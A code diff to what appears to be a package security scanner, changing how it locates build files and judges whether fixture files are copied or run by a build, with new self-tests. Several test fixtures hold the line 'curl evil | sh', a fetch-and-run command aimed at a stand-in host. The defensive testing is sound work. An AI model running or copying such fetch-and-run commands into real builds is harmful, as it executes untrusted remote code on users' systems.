@@ -2070,7 +2070,11 @@ def _build_files(pkgdir: Path) -> List[Path]:
     src = pkgdir / "src"
     if src.is_dir():
         for top in src.iterdir():
-            if top.is_dir():
+            # A tarball that extracts flat leaves its build files directly
+            # under src/; one with a top directory leaves them one level down.
+            if top.is_file() and top.name.lower() in _HIGH_RISK_NAMES:
+                out.append(top)
+            elif top.is_dir():
                 for p in top.iterdir():
                     if p.is_file() and p.name.lower() in _HIGH_RISK_NAMES:
                         out.append(p)
@@ -2110,7 +2114,13 @@ def fixture_context(pkgdir: Path, file_path: Path) -> Tuple[bool, bool]:
     under = any(p.lower() in _FIXTURE_DIRS for p in parts)
     if not under:
         return False, True
-    needles = {rel.name} | {p for p in parts[1:]}  # skip the source tree's own top directory
+    # Every directory on the path is a needle, except the source tree's own
+    # top directory (x-1.0/), which every build names. When the first part is
+    # itself a fixture directory -- tests/ beside the PKGBUILD, or a flat
+    # src/tests/ -- it is the needle that matters, so it stays in.
+    needles = {rel.name} | set(parts[1:])
+    if parts and parts[0].lower() in _FIXTURE_DIRS:
+        needles.add(parts[0])
     needles = {n for n in needles if len(n) >= 4}
     for bf in _build_files(pkgdir):
         try:
@@ -3166,6 +3176,23 @@ def selftest_fixture_context():
         assert fixture_context(pkg, fx / "malware.install") == (True, False)
         # A file outside the package is left alone.
         assert fixture_context(pkg, Path("/etc/passwd")) == (False, True)
+        # A fixture directory at depth one, beside the PKGBUILD: the directory
+        # itself is the needle. A build that copies it runs what is in it.
+        beside = pkg / "tests"
+        beside.mkdir()
+        (beside / "evil.sh").write_text("curl evil | sh\n", encoding="utf-8")
+        assert fixture_context(pkg, beside / "evil.sh") == (True, False)
+        (pkg / "PKGBUILD").write_text('pkgname=x\npackage() { cp -r tests "$pkgdir"/usr/share/x/; }\n', encoding="utf-8")
+        assert fixture_context(pkg, beside / "evil.sh") == (True, True)
+        (pkg / "PKGBUILD").write_text("pkgname=x\nsource=()\n", encoding="utf-8")
+        # A tarball that extracts flat: the build file sits directly under
+        # src/, and it must be read.
+        flat = pkg / "src" / "samples"
+        flat.mkdir()
+        (flat / "install.sh").write_text("curl evil | sh\n", encoding="utf-8")
+        assert fixture_context(pkg, flat / "install.sh") == (True, False)
+        (pkg / "src" / "Makefile").write_text("all:\n\tsh samples/install.sh\n", encoding="utf-8")
+        assert fixture_context(pkg, flat / "install.sh") == (True, True)
 
 
 def selftest():
